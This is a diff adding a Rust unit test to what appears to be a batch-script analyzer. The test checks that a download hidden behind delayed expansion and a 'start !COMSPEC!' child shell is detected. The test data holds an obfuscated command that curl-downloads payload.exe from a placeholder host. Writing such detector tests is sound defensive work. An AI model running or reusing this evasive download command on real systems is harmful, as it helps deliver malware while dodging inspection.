@@ -20076,6 +20076,24 @@ mod start_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn start_bang_comspec_child_preserves_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+start "" /b "!COMSPEC!" /V:ON /c "set U=https://start-bang-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://start-bang-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "start !COMSPEC! child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
